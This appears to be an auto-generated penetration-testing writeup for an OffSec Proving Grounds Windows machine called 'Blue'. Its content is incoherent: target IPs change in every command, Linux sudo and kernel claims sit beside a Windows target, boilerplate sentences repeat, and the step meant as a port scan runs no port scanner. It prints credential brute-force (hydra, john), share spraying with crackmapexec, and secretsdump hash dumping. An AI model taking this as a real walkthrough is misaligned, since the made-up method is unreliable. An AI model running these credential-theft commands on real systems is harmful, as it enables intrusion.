---
TitleSEO: "OffSec Proving Grounds — Blue (Medium Windows) | ZureFX"
TitlePost: "OffSec Proving Grounds — Blue (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Blue. Resource-Based Constrained Delegation and Path Traversal to achieve medium compromise on Windows."
Keywords: "medium, insane, easy, offsec"
URL: "https://zurefx.github.io/writeups/htb-blue-446.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-blue-446/"
Date: "2025-09-17"
Tags: "Medium, Insane, Easy, OffSec"
Section: "writeups"
Lang: "en"
main_img: "htb-blue-446"
Permalink: "/writeups/htb-blue-446.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Blue** is rated **Medium** on OffSec Proving Grounds. It runs **Windows** and the IP address during this analysis was `10.37.98.28`.

### Objectives

Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.77.41.79 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.23.252.112 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.49.193.159 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Service Enumeration

Command injection was possible through unsanitized user input in the search functionality. Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.101.148.89
evil-winrm -i 10.54.117.160 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.44.92.34/FUZZ
```

The service was running without proper input validation, leading to injection vulnerabilities. The service account had excessive permissions assigned in Active Directory.

### SMB Enumeration

The database credentials were hardcoded in the application source code. The target system was identified as running a vulnerable version of the service.

```bash
feroxbuster -h
crackmapexec smb 10.52.63.162 -u administrator -p 'P@ssw0rd!' --shares
```

The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target. Group Policy Preferences contained encrypted but recoverable credentials.

## Exploitation

### Vulnerability Identification

The target system was identified as running a vulnerable version of the service. Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

Key finding: **Resource-Based Constrained Delegation**.

The target system was identified as running a vulnerable version of the service. Privilege escalation was possible due to misconfigured sudo permissions.

### Initial Access

The scheduled task ran with elevated privileges and could be abused for escalation. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.69.190.69/FUZZ
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.

## Privilege Escalation

### Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.84.54 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

The application stored sensitive credentials in an unencrypted configuration file. Initial enumeration revealed several interesting open ports on the target.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.45.151.17/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.99.216.202/FUZZ
crackmapexec smb 10.30.147.83 -u administrator -p 'P@ssw0rd!' --shares
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Lateral movement was facilitated by reusing discovered credentials across services.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services.

## Summary

### Tools Used

- `netcat`
- `enum4linux`
- `nmap`
- `john`
- `secretsdump`
- `GetUserSPNs`

### Key Takeaways

- Resource-Based Constrained Delegation
- Path Traversal
- SQL Injection
